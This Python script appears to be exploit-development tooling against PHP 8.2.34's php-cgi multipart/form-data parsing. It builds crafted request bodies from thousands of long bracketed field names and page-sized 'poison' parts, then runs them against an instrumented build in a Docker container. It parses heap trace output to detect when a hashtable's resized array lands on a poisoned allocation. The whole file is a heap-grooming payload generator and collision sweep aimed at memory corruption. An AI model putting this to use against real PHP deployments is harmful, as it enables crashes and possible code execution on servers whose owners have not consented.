#!/usr/bin/env python3
"""oom49: poison-size x count sweep for arData-2 collision.
Sizes in PAGES (1 page = 4096): ask = 33 + 16*cells chosen so total pages match.
cells = (pages*4096 - 10 - 1 - 10) // 16 tuned in-script; run k1=2046, prep in {1,3}.
Detector: coll (resize lret2 addr in poison addr set) and death, rc."""
import re
import subprocess
import sys

NAMELEN = 3064
BIN34 = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"


def dx(cmd, inp=None, timeout=590):
    args = ["docker", "exec"]
    if inp is not None:
        args.append("-i")
    args += ["phpbuild", "sh", "-c", cmd]
    r = subprocess.run(args, input=inp, capture_output=True, timeout=timeout)
    return r.returncode, r.stdout.decode("latin1")


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, cells):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * cells + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build(k1, prep, cells):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n, cells) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def run_once(k1, prep, cells, lim="20600000"):
    body = build(k1, prep, cells)
    dx("cat > /tmp/att.bin", inp=body, timeout=120)
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "%s -d memory_limit=%s -d post_max_size=4096M -d max_input_vars=100000 "
           "</tmp/att.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?") % (len(body), BIN34, lim)
    _, out = dx(cmd)
    _, tr = dx("cat /tmp/e.log /tmp/o.log")
    resize_at = tr.rfind("TRACE resize from=2048 to=4096")
    pre = tr[:resize_at if resize_at > 0 else len(tr)]
    ask = 33 + 16 * cells
    poison_addrs = set()
    for m2 in re.finditer(r"TRACE lret2 size=(\d+) ret=(0x[0-9a-f]+)", pre):
        if ask - 64 <= int(m2.group(1)) <= ask + 64:
            poison_addrs.add(m2.group(2))
    m = re.search(r"TRACE lret2 size=163840 ret=(0x[0-9a-f]+)", tr[resize_at:resize_at + 400])
    arda2 = m.group(1) if m else "?"
    coll = arda2 in poison_addrs and arda2 != "?"
    commits = re.findall(r"TRACE keycommit stage=1 elem=(\d+)", tr)
    n_ok = tr.count("TRACE keyok stage=1")
    rc = out.strip().replace("RC=", "")
    print("cells=%d ask=%d prep=%d rc=%s coll=%s lastelem=%s death=%s poison=%d" %
          (cells, ask, prep, rc, coll, commits[-1] if commits else "-",
           len(commits) > n_ok, len(poison_addrs)), flush=True)
    if coll:
        print("  *** COLLISION arda2=%s poison=%s" % (arda2, sorted(poison_addrs)), flush=True)
    return coll


if __name__ == "__main__":
    k1 = 2046
    for pages in (20, 30, 40, 60, 80):
        # name bytes: 1 + 16*cells + 6 + 3 quotes/misc -> ask = 33 + 16*cells
        # want ask such that (ask) rounds up to pages*4096: ask = pages*4096 - 15
        ask = pages * 4096 - 15
        cells = (ask - 33) // 16
        for prep in (1, 3):
            run_once(k1, prep, cells)
